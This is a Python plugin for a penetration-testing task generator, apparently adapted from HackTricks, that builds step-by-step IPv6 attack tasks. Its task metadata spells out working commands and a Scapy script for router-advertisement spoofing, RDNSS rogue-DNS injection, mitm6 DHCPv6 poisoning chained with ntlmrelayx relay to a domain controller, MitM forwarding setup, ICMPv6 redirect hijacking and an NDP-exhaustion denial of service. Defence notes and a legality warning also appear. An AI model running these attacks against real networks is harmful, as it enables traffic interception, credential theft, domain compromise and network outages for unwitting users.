"""
IPv6 Pentesting service plugin

Generates tasks for IPv6 network attacks including:
- ICMPv6 Router Advertisement (RA) spoofing
- DHCPv6 DNS poisoning (mitm6 attacks)
- RDNSS (DNS) spoofing via RA
- IPv6 neighbor discovery and enumeration
- IPv6 man-in-the-middle attacks
- Link-local address discovery

OSCP RELEVANCE: IPv6 attacks often overlooked, excellent for
stealthy network positioning and bypassing IPv4-only defenses.

Extracted from HackTricks: pentesting-network/pentesting-ipv6.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class IPv6AttacksPlugin(ServicePlugin):
    """IPv6 network attack and enumeration plugin"""

    @property
    def name(self) -> str:
        return "ipv6-attacks"

    @property
    def default_ports(self) -> List[int]:
        # Trigger on any open port indicating host is up
        return [80, 443, 22, 21, 445, 139, 3389]

    @property
    def service_names(self) -> List[str]:
        # Trigger on common services to add IPv6 attack vectors
        return ['http', 'https', 'ssh', 'ftp', 'smb', 'rdp', 'microsoft-ds']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect when IPv6 attacks are applicable

        Triggers when ANY service is detected (IPv6 attacks are network-layer,
        not service-specific). This ensures IPv6 attack tasks are added to
        every target for comprehensive coverage.
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check if any common service detected (indicates host is up)
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate IPv6 attack task tree"""

        tasks = {
            'id': f'ipv6-attacks-{port}',
            'name': f'IPv6 Network Attacks (Layer 2/3)',
            'type': 'parent',
            'children': []
        }

        # ========== PHASE 1: IPv6 RECONNAISSANCE ==========
        recon_tasks = {
            'id': f'ipv6-recon-{port}',
            'name': 'IPv6 Discovery and Enumeration',
            'type': 'parent',
            'children': []
        }

        # Task 1: Ping IPv6 multicast (discover all nodes)
        recon_tasks['children'].append({
            'id': f'ipv6-ping-multicast-{port}',
            'name': 'Discover IPv6 Hosts (Multicast Ping)',
            'type': 'command',
            'metadata': {
                'command': 'ping6 -I eth0 -c 5 ff02::1',
                'description': 'Send ICMPv6 ping to all nodes multicast to discover IPv6 hosts',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'ENUM', 'STEALTH'],
                'flag_explanations': {
                    '-I eth0': 'Network interface to use (required for link-local)',
                    '-c 5': 'Send 5 ping packets',
                    'ff02::1': 'IPv6 multicast "all nodes" address (like 255.255.255.255 in IPv4)'
                },
                'success_indicators': [
                    'Multiple replies from different IPv6 addresses',
                    'Link-local addresses (fe80::...) responding',
                    'Global unicast addresses (2xxx:...) responding'
                ],
                'failure_indicators': [
                    'No replies (IPv6 may be disabled or firewalled)',
                    'Network unreachable (wrong interface)',
                    'Permission denied (needs sudo for raw sockets on some systems)'
                ],
                'next_steps': [
                    'View discovered neighbors: ip -6 neigh',
                    'Scan discovered IPv6 addresses with nmap -6',
                    'Try router multicast: ping6 -I eth0 ff02::2',
                    'Check for IPv6 routing: ip -6 route'
                ],
                'alternatives': [
                    'alive6 eth0 (from thc-ipv6 toolkit)',
                    'nmap -6 -sn ff02::1%eth0 (network discovery)',
                    'atk6-alive6 eth0 (alternative tool)',
                    'Manual: ip -6 neigh show (view existing neighbor cache)'
                ],
                'notes': 'IPv6 multicast discovery is STEALTHY - normal network behavior. All IPv6 hosts join ff02::1 (all nodes) by default. Use "ip a" to find your interface name (eth0, wlan0, etc.). Link-local (fe80::/10) addresses are auto-configured, no DHCP needed.'
            }
        })

        # Task 2: alive6 comprehensive scan
        recon_tasks['children'].append({
            'id': f'alive6-scan-{port}',
            'name': 'Comprehensive IPv6 Host Discovery',
            'type': 'command',
            'metadata': {
                'command': 'alive6 eth0',
                'description': 'Advanced IPv6 host discovery using THC-IPv6 toolkit',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'AUTOMATED'],
                'flag_explanations': {
                    'eth0': 'Network interface to scan'
                },
                'success_indicators': [
                    'Found alive addresses listed',
                    'MAC addresses correlated to IPv6',
                    'Both link-local and global addresses discovered'
                ],
                'failure_indicators': [
                    'No hosts found (wrong interface or IPv6 disabled)',
                    'Permission denied (requires root)',
                    'Tool not installed (apt install thc-ipv6)'
                ],
                'next_steps': [
                    'Port scan discovered hosts: nmap -6 -sV -sC <ipv6-addr>',
                    'Check for IPv6-only services',
                    'Derive link-local from MAC for specific targeting',
                    'Map topology: Document which hosts have IPv6 enabled'
                ],
                'alternatives': [
                    'ping6 -I eth0 ff02::1 && ip -6 neigh (manual method)',
                    'atk6-detect-new-ip6 eth0 (detect new hosts joining)',
                    'Passive listening: tcpdump -i eth0 ip6 (monitor IPv6 traffic)',
                    'Scapy sniffer: sniff(iface="eth0", filter="ip6", prn=handler)'
                ],
                'notes': 'alive6 is part of THC-IPv6 toolkit (apt install thc-ipv6). More comprehensive than simple ping. Discovers: link-local (fe80::), unique local (fc00::/7), and global unicast (2000::/3) addresses.'
            }
        })

        # Task 3: Passive NDP/DHCPv6 sniffing
        recon_tasks['children'].append({
            'id': f'passive-ipv6-sniff-{port}',
            'name': 'Passive IPv6 NDP/DHCPv6 Monitoring',
            'type': 'manual',
            'metadata': {
                'description': 'Passively monitor ICMPv6 NDP and DHCPv6 to map network topology',
                'tags': ['OSCP:HIGH', 'STEALTH', 'ENUM', 'MANUAL'],
                'notes': '''PASSIVE IPv6 MONITORING (ZERO PACKET GENERATION):

1. Enable promiscuous mode:
   sudo ip link set dev eth0 promisc on

2. Capture ICMPv6 Neighbor Discovery:
   sudo tcpdump -i eth0 -vvv 'icmp6 and (ip6[40]==133 or ip6[40]==134 or ip6[40]==135 or ip6[40]==136)' -w ipv6-ndp.pcap

   Message Types:
   - 133: Router Solicitation (client looking for router)
   - 134: Router Advertisement (router announces presence)
   - 135: Neighbor Solicitation (ARP equivalent)
   - 136: Neighbor Advertisement (ARP reply equivalent)

3. Capture DHCPv6:
   sudo tcpdump -i eth0 -vvv 'udp port 546 or udp port 547' -w ipv6-dhcp.pcap

4. Parse captures:
   - View with: wireshark ipv6-ndp.pcap
   - Extract IPs: tcpdump -r ipv6-ndp.pcap -n | grep -oP 'fe80::[a-f0-9:]+' | sort -u
   - Map MAC to IPv6: ip -6 neigh show

WHAT YOU LEARN:
- Complete link-local topology (MAC ↔ IPv6)
- IPv6 addresses and prefixes in use
- Router addresses (default gateways)
- DNS servers (via RA RDNSS or DHCPv6)
- SLAAC vs DHCPv6 configuration
- Network segmentation

TIME: Run for 5-10 minutes to capture periodic announcements.

ADVANTAGES:
- Completely passive (no packets sent)
- Evades IDS/IPS that look for active scans
- Discovers hosts that don't respond to ping''',
                'alternatives': [
                    'Python/Scapy sniffer (see HackTricks for full script)',
                    'ndpmon (dedicated NDP monitoring tool)',
                    'Wireshark live capture with filter: icmp6 || dhcpv6'
                ]
            }
        })

        # Task 4: DNS AAAA record enumeration
        recon_tasks['children'].append({
            'id': f'dns-aaaa-enum-{port}',
            'name': 'Enumerate IPv6 DNS Records',
            'type': 'command',
            'metadata': {
                'command': f'dig AAAA {target} ANY',
                'description': 'Query DNS for IPv6 addresses (AAAA records)',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    'AAAA': 'IPv6 address record (like A record for IPv4)',
                    target: 'Target domain or hostname',
                    'ANY': 'Request all available DNS records'
                },
                'success_indicators': [
                    'AAAA record found (shows IPv6 address)',
                    'Multiple IPv6 addresses returned',
                    'IPv6 address starting with 2xxx: (global unicast)'
                ],
                'failure_indicators': [
                    'No AAAA records found (IPv6 not configured)',
                    'NXDOMAIN (domain does not exist)',
                    'Query timeout (DNS server issue)'
                ],
                'next_steps': [
                    'Scan discovered IPv6 addresses: nmap -6 -sV <ipv6-addr>',
                    'Check for IPv6-only services (may bypass IPv4 firewall)',
                    'Test connectivity: ping6 <ipv6-addr>',
                    'Try zone transfer: dig AXFR @dns-server domain.com (for all IPv6 hosts)'
                ],
                'alternatives': [
                    f'host -t AAAA {target}',
                    f'nslookup -type=AAAA {target}',
                    f'fierce --domain {target} (finds subdomains with IPv6)',
                    'dnsrecon -t aaaa -d domain.com'
                ],
                'notes': 'AAAA = quad-A (4x A, IPv4 uses single A record). Many organizations have IPv6 enabled but poorly secured. Check subdomains: ipv6.domain.com often exists. Global unicast prefix: 2000::/3.'
            }
        })

        tasks['children'].append(recon_tasks)

        # ========== PHASE 2: IPv6 MAN-IN-THE-MIDDLE ATTACKS ==========
        mitm_tasks = {
            'id': f'ipv6-mitm-{port}',
            'name': 'IPv6 Man-in-the-Middle Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 5: Router Advertisement spoofing
        mitm_tasks['children'].append({
            'id': f'ra-spoof-{port}',
            'name': 'IPv6 Router Advertisement Spoofing',
            'type': 'command',
            'metadata': {
                'command': 'atk6-fake_router6 eth0 fe80::1/64',
                'description': 'Announce fake IPv6 router to become default gateway (MitM)',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MITM', 'NOISY'],
                'flag_explanations': {
                    'eth0': 'Network interface',
                    'fe80::1/64': 'Link-local address to use as fake router'
                },
                'success_indicators': [
                    'Sending router advertisements',
                    'Clients configuring your address as gateway',
                    'Traffic routing through attacker machine',
                    'ip -6 route on clients shows your address as default'
                ],
                'failure_indicators': [
                    'Permission denied (requires root)',
                    'No clients updating routes',
                    'RA Guard enabled on switch (enterprise defense)',
                    'Legitimate router winning race with faster RAs'
                ],
                'next_steps': [
                    'Enable IPv6 forwarding: sudo sysctl -w net.ipv6.conf.all.forwarding=1',
                    'Set up traffic capture: tcpdump -i eth0 -w ipv6-mitm.pcap',
                    'Relay IPv6 traffic to legitimate gateway',
                    'Analyze captured traffic for credentials',
                    'Combine with DNS spoofing (next task)'
                ],
                'alternatives': [
                    'Scapy RA spoofing (custom Python script for control)',
                    'atk6-redir6 eth0 <victim-ipv6> <target-ipv6> (redirect specific host)',
                    'Bettercap IPv6: bettercap -iface eth0 --ipv6',
                    'Manual: Send ICMPv6 Type 134 (RA) with Scapy'
                ],
                'notes': 'RA spoofing MORE RELIABLE than ARP spoofing (IPv4). Send RAs more frequently than legitimate router (default 200s). High Prf (preference) makes your router preferred. REQUIREMENTS: (1) Same L2 segment, (2) No RA Guard. IMPACT: Full MitM on IPv6 traffic. Defense: RA Guard on managed switches.'
            }
        })

        # Task 6: RDNSS DNS spoofing via RA
        mitm_tasks['children'].append({
            'id': f'rdnss-spoof-{port}',
            'name': 'IPv6 DNS Spoofing via RDNSS',
            'type': 'manual',
            'metadata': {
                'description': 'Inject fake DNS server via Router Advertisement RDNSS option',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MITM'],
                'notes': '''RDNSS (RFC 8106) DNS HIJACKING:

Modern OSes trust DNS servers announced in Router Advertisements.

1. Create Scapy RA with RDNSS:
   ```python
   from scapy.all import *

   # Your link-local address
   fake_dns = "fe80::dead:beef"

   ra = (IPv6(src=fake_dns, dst='ff02::1', hlim=255)/
         ICMPv6ND_RA(routerlifetime=0)/
         ICMPv6NDOptRDNSS(dns=[fake_dns], lifetime=600))

   send(ra, iface='eth0', loop=1, inter=5)
   ```

2. Set up fake DNS server:
   fakedns.py or dnschef on your IPv6 address

3. Clients will prepend your DNS for 600 seconds

4. Capture DNS queries and respond with attacker IPs

SUPPORTED OSes:
✓ Windows 10 ≥ 1709
✓ Windows 11
✓ macOS Big Sur+
✓ Linux systemd-resolved

ADVANTAGES:
- No need to become gateway (lower footprint)
- DNS hijacking without full MitM
- Combines with WPAD/NTLM relay

DEFENSE:
- RA Guard with RDNSS filtering
- Static DNS configuration
- Monitor for RDNSS changes

ALTERNATIVE: DHCPv6 DNS spoofing (next task)''',
                'alternatives': [
                    'atk6-fake_dns6d eth0 fe80::dead:beef domain.com attacker-ip',
                    'mitm6 (combines DHCPv6 + DNS spoofing)'
                ]
            }
        })

        # Task 7: mitm6 DHCPv6 DNS poisoning
        mitm_tasks['children'].append({
            'id': f'mitm6-attack-{port}',
            'name': 'mitm6: DHCPv6 DNS Poisoning',
            'type': 'command',
            'metadata': {
                'command': 'sudo mitm6 -i eth0 --no-ra',
                'description': 'DHCPv6 DNS poisoning for Windows NTLM relay (mitm6 attack)',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTOMATED', 'NTLM'],
                'flag_explanations': {
                    '-i eth0': 'Network interface to use',
                    '--no-ra': 'Disable Router Advertisement (only DHCPv6 poisoning)'
                },
                'success_indicators': [
                    '[*] Starting mitm6 on eth0',
                    '[*] Sent spoofed reply to DHCPv6 request',
                    '[*] Client assigned attacker as DNS for 300 seconds',
                    'Authentication attempts to attacker-controlled DNS'
                ],
                'failure_indicators': [
                    'No DHCPv6 requests (network using SLAAC only)',
                    'DHCPv6 Guard enabled (enterprise defense)',
                    'Legitimate DHCPv6 responding faster'
                ],
                'next_steps': [
                    'Combine with ntlmrelayx for full attack:',
                    '  Terminal 1: sudo mitm6 -i eth0 -d domain.local',
                    '  Terminal 2: sudo ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh attacker.domain.local -l loot/',
                    'Captured NTLM relay to LDAP for domain escalation',
                    'Check loot/ directory for domain info'
                ],
                'alternatives': [
                    'Manual DHCPv6: Configure ISC DHCPv6 server with malicious settings',
                    'Scapy DHCPv6 spoofing (custom script)',
                    'atk6-fake_dhcp6s eth0 (THC-IPv6 toolkit)'
                ],
                'notes': 'mitm6 = POWERFUL Windows attack. Exploits: (1) Windows prefers IPv6 over IPv4, (2) DHCPv6 assigns DNS, (3) WPAD via DNS → NTLM auth → relay to LDAP. 300-second lifetime = 5-minute window. Common in Windows networks with default settings. Defense: Disable IPv6 or use DHCPv6 Guard. GitHub: fox-it/mitm6. OSCP GOLD: Frequently successful in AD labs.'
            }
        })

        # Task 8: IPv6 MitM with traffic forwarding
        mitm_tasks['children'].append({
            'id': f'ipv6-mitm-forward-{port}',
            'name': 'Enable IPv6 Traffic Forwarding (MitM Setup)',
            'type': 'command',
            'metadata': {
                'command': 'sudo sysctl -w net.ipv6.conf.all.forwarding=1 && sudo ip6tables -A FORWARD -i eth0 -j ACCEPT && sudo ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE',
                'description': 'Configure IPv6 forwarding and NAT for transparent MitM',
                'tags': ['OSCP:HIGH', 'MITM', 'MANUAL'],
                'flag_explanations': {
                    'net.ipv6.conf.all.forwarding=1': 'Enable IPv6 packet forwarding (router mode)',
                    'ip6tables -A FORWARD -i eth0 -j ACCEPT': 'Allow forwarding on interface',
                    'ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE': 'NAT outgoing packets (hide source)'
                },
                'success_indicators': [
                    'net.ipv6.conf.all.forwarding = 1',
                    'ip6tables rules added successfully',
                    'Victim traffic passing through attacker',
                    'Victim maintains internet connectivity'
                ],
                'failure_indicators': [
                    'Permission denied (requires sudo)',
                    'Victims lose connectivity (forwarding not working)',
                    'ip6tables command not found (install iptables)'
                ],
                'next_steps': [
                    'Verify forwarding: cat /proc/sys/net/ipv6/conf/all/forwarding (should show 1)',
                    'Capture traffic: sudo tcpdump -i eth0 ip6 -w mitm-capture.pcap',
                    'Analyze with Wireshark for credentials',
                    'Run SSL stripping if HTTPS present',
                    'Document intercepted traffic sources'
                ],
                'alternatives': [
                    'Manual forwarding: echo 1 > /proc/sys/net/ipv6/conf/all/forwarding',
                    'Bettercap: bettercap -iface eth0 --ipv6 (handles forwarding automatically)',
                    'iptables-persistent: Save rules permanently'
                ],
                'notes': 'RUN AFTER RA spoofing or DHCPv6 poisoning. Without forwarding, victims lose connectivity (DoS). MASQUERADE hides attacker IP. To revert: sysctl -w net.ipv6.conf.all.forwarding=0. Check forwarding status: sysctl net.ipv6.conf.all.forwarding'
            }
        })

        tasks['children'].append(mitm_tasks)

        # ========== PHASE 3: IPv6-SPECIFIC ATTACKS ==========
        specific_attacks = {
            'id': f'ipv6-specific-{port}',
            'name': 'IPv6-Specific Attack Techniques',
            'type': 'parent',
            'children': []
        }

        # Task 9: Link-local to MAC derivation
        specific_attacks['children'].append({
            'id': f'ipv6-mac-derive-{port}',
            'name': 'Derive IPv6 from MAC Address',
            'type': 'manual',
            'metadata': {
                'description': 'Calculate link-local IPv6 address from known MAC address',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                'notes': '''DERIVE LINK-LOCAL IPv6 FROM MAC:

Example MAC: 12:34:56:78:9a:bc

STEPS:
1. Convert to IPv6 format:
   12:34:56:78:9a:bc → 1234:5678:9abc

2. Prepend fe80:: and insert fffe:
   fe80::1234:56ff:fe78:9abc

3. Invert 7th bit from left (U/L bit):
   1234 → 1034 (in binary: 0001 0010... → 0001 0000...)

   Final: fe80::1034:56ff:fe78:9abc

FORMULA:
- Take MAC: MM:MM:MM:SS:SS:SS
- Insert fffe in middle: MM:MM:MM:ff:fe:SS:SS:SS
- Toggle 7th bit (Universal/Local)
- Prepend fe80::

WHY THIS MATTERS:
- If you know MAC (from ARP, switch CAM table, DHCP logs)
- You can calculate IPv6 address without scanning
- Useful for targeted attacks

TOOL:
ipv6calc --action prefixmac2ipv6 --in prefix+mac fe80:: 12:34:56:78:9a:bc

ALTERNATIVE METHOD:
Check neighbor cache for MAC→IPv6 mapping:
ip -6 neigh show | grep <mac-address>''',
                'alternatives': [
                    'Online calculator: https://ben.akrin.com/?p=1347',
                    'Script: ipv6-toolkit (SI6 Networks)',
                    'Scapy: mac2ipv6(mac_addr, prefix="fe80::")'
                ]
            }
        })

        # Task 10: ICMPv6 redirect attack
        specific_attacks['children'].append({
            'id': f'icmpv6-redirect-{port}',
            'name': 'ICMPv6 Redirect Attack (Traffic Hijacking)',
            'type': 'command',
            'metadata': {
                'command': 'atk6-redir6 eth0 <victim-ipv6> <target-ipv6>',
                'description': 'Send ICMPv6 redirect to hijack specific traffic flows',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MITM'],
                'flag_explanations': {
                    'eth0': 'Network interface',
                    '<victim-ipv6>': 'Target client to redirect',
                    '<target-ipv6>': 'Destination traffic to intercept'
                },
                'success_indicators': [
                    'Sending ICMPv6 redirects',
                    'Victim updates routing table',
                    'Traffic to target now routes through attacker'
                ],
                'failure_indicators': [
                    'Victim ignoring redirects (security hardening)',
                    'Permission denied (requires root)',
                    'No traffic change (redirect not accepted)'
                ],
                'next_steps': [
                    'Enable forwarding (see IPv6 MitM setup task)',
                    'Capture redirected traffic',
                    'More surgical than full RA spoofing (less noisy)',
                    'Target specific high-value flows'
                ],
                'alternatives': [
                    'Scapy ICMPv6 Redirect: send(IPv6()/ICMPv6ND_Redirect())',
                    'Manual: Craft Type 137 ICMPv6 packet'
                ],
                'notes': 'ICMPv6 Redirect (Type 137) = "Better route available". More targeted than RA spoofing. Defense: Ignore redirects (sysctl net.ipv6.conf.all.accept_redirects=0).'
            }
        })

        # Task 11: IPv6 NDP exhaustion (DoS)
        specific_attacks['children'].append({
            'id': f'ndp-exhaustion-{port}',
            'name': 'NDP Table Exhaustion Attack (DoS)',
            'type': 'manual',
            'metadata': {
                'description': 'Exhaust router/switch NDP neighbor table (IPv6 equivalent of CAM table overflow)',
                'tags': ['OSCP:LOW', 'DOS', 'NOISY'],
                'notes': '''NDP EXHAUSTION ATTACK:

Similar to CAM table overflow in IPv4, but for IPv6 Neighbor Discovery Protocol.

CONCEPT:
- Routers/switches maintain NDP cache (like ARP cache)
- Limited size (often 1000-4096 entries)
- Generate massive number of fake IPv6 addresses
- Fill NDP cache → legitimate traffic dropped → DoS

TOOL: atk6-dos-new-ip6 eth0

IMPACT:
- Router spends CPU resolving non-existent addresses
- Legitimate neighbor discovery fails
- Network disruption (DoS)

DETECTION:
- Surge in Neighbor Solicitation messages
- Router/switch CPU spike
- Network logs show NDP cache full

DEFENSE:
- NDP cache size limits
- Rate limiting NS/NA messages
- Port security on switches

LEGALITY:
⚠ DoS attack - ONLY in authorized pentest scope
⚠ Will disrupt network - use in isolated lab only
⚠ Not recommended for OSCP exam (could crash exam network)

ALTERNATIVE (Less Disruptive):
Check NDP cache size before attack:
ip -6 neigh show | wc -l''',
                'alternatives': [
                    'atk6-dos-new-ip6 eth0 (flood new IPv6 addresses)',
                    'flood_router6 eth0 (flood router with traffic)',
                    'Manual: Scapy loop sending NS to random addresses'
                ]
            }
        })

        # Task 12: IPv6 port scanning
        specific_attacks['children'].append({
            'id': f'ipv6-port-scan-{port}',
            'name': 'IPv6 Port Scanning',
            'type': 'command',
            'metadata': {
                'command': f'nmap -6 -sV -sC -p- {target}',
                'description': 'Comprehensive IPv6 port scan (may find services hidden on IPv4)',
                'tags': ['OSCP:HIGH', 'ENUM', 'AUTOMATED'],
                'flag_explanations': {
                    '-6': 'Enable IPv6 scanning',
                    '-sV': 'Service version detection',
                    '-sC': 'Default NSE scripts',
                    '-p-': 'Scan all 65535 ports'
                },
                'success_indicators': [
                    'Open ports discovered',
                    'Services identified',
                    'Version banners captured',
                    'Different results than IPv4 scan (services only on IPv6)'
                ],
                'failure_indicators': [
                    'All ports filtered (firewall)',
                    'Host unreachable (wrong IPv6 address)',
                    'Name or service not known (invalid address format)'
                ],
                'next_steps': [
                    'Compare IPv6 results to IPv4 scan (look for differences)',
                    'Check for IPv6-only admin interfaces',
                    'Test discovered services for vulnerabilities',
                    'Check if IPv6 firewalls less restrictive than IPv4'
                ],
                'alternatives': [
                    f'nmap -6 -Pn -sT {target} (TCP connect scan, no ping)',
                    'For link-local: nmap -6 -sV fe80::1234%eth0 (specify interface with %)',
                    'unicornscan -6 -mT {target}:1-65535',
                    'masscan -6 -p1-65535 {target} --rate=1000'
                ],
                'notes': 'IPv6 addresses in nmap: Use brackets for URLs [2001:db8::1] or direct 2001:db8::1. Link-local addresses REQUIRE interface: fe80::1234%eth0. Common finding: Management interfaces on IPv6 with weaker firewall rules than IPv4.'
            }
        })

        tasks['children'].append(specific_attacks)

        # ========== PHASE 4: DEFENSE DETECTION ==========
        defense_tasks = {
            'id': f'ipv6-defenses-{port}',
            'name': 'Check IPv6 Security Posture',
            'type': 'parent',
            'children': []
        }

        # Task 13: Check for IPv6 defenses
        defense_tasks['children'].append({
            'id': f'check-ipv6-defenses-{port}',
            'name': 'Enumerate IPv6 Security Controls',
            'type': 'manual',
            'metadata': {
                'description': 'Assess network IPv6 security posture and defenses',
                'tags': ['OSCP:MEDIUM', 'RECON', 'MANUAL'],
                'notes': '''IPv6 SECURITY ASSESSMENT:

1. RA GUARD:
   - Test: Send fake RA, check if clients accept
   - Tool: atk6-fake_router6 eth0 fe80::evil/64
   - Detection: If RAs blocked, switch has RA Guard
   - Impact: Prevents RA spoofing MitM

2. DHCPv6 GUARD:
   - Test: mitm6 -i eth0, check if DHCPv6 replies accepted
   - Detection: Replies blocked = DHCPv6 Guard enabled
   - Impact: Prevents DHCPv6 poisoning

3. NDP INSPECTION:
   - Test: Send NS/NA with fake MAC→IP binding
   - Detection: Binding rejected = NDP Inspection active
   - Impact: Prevents NDP spoofing attacks

4. IPv6 SOURCE GUARD:
   - Test: Send packets with spoofed source
   - Detection: Packets dropped = Source Guard enabled
   - Impact: Prevents source IP spoofing

5. PORT ACLs:
   - Test: Send RAs from non-router port
   - Detection: RAs blocked on client ports = Port ACL
   - Impact: Only designated router ports can send RAs

6. IPv6 DISABLED:
   - Test: ping6 ff02::1, check responses
   - Detection: No responses = IPv6 disabled/firewalled
   - Impact: No IPv6 attack surface

7. SEND (Secure Neighbor Discovery):
   - Test: Attempt unsigned NS/NA
   - Detection: Rejected = SEND (CGA) required
   - Impact: All NDP must be cryptographically signed
   - Note: Rarely deployed (complex)

CHECK METHODS:
- Switch config audit (requires access)
- Test attacks and observe success/failure
- Monitor logs for security events
- Traffic analysis (see if attacks propagate)

COMMON FINDINGS:
✗ Most networks: No IPv6 security controls
✓ Enterprise networks: RA Guard at minimum
✓ High-security: Multiple controls + monitoring

RECOMMENDATIONS:
✓ Enable RA Guard on all access ports
✓ Enable DHCPv6 Guard
✓ Disable IPv6 if not needed
✓ Monitor ICMPv6 traffic for anomalies
✓ Use SEND (CGA) in high-security environments''',
                'alternatives': [
                    'Nmap IPv6 firewall test: nmap -6 -sA <target>',
                    'chiron.py: Automated IPv6 security assessment',
                    'ipv6toolkit: Comprehensive testing suite'
                ]
            }
        })

        tasks['children'].append(defense_tasks)

        return tasks


    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Parse results and spawn additional tasks"""
        new_tasks = []

        # If IPv6 hosts discovered, add scanning task
        if 'ipv6-ping' in task_id or 'alive6' in task_id:
            if 'fe80::' in result or '2' in result[0]:  # Link-local or global unicast
                new_tasks.append({
                    'id': f'scan-ipv6-hosts-{task_id}',
                    'name': 'Port Scan Discovered IPv6 Hosts',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Scan IPv6 hosts discovered in reconnaissance',
                        'tags': ['OSCP:HIGH', 'ENUM'],
                        'notes': 'Extract IPv6 addresses from discovery output and scan: nmap -6 -sV -sC <ipv6-addr>'
                    }
                })

        # If mitm6 successful, suggest ntlmrelayx
        if 'mitm6' in task_id and 'Sent spoofed reply' in result:
            new_tasks.append({
                'id': f'ntlmrelay-ipv6-{task_id}',
                'name': 'Combine mitm6 with ntlmrelayx',
                'type': 'manual',
                'metadata': {
                    'description': 'Run ntlmrelayx to relay IPv6-captured NTLM auth',
                    'tags': ['OSCP:HIGH', 'EXPLOIT'],
                    'notes': 'Terminal 2: sudo ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh attacker.domain.local -l loot/'
                }
            })

        return new_tasks
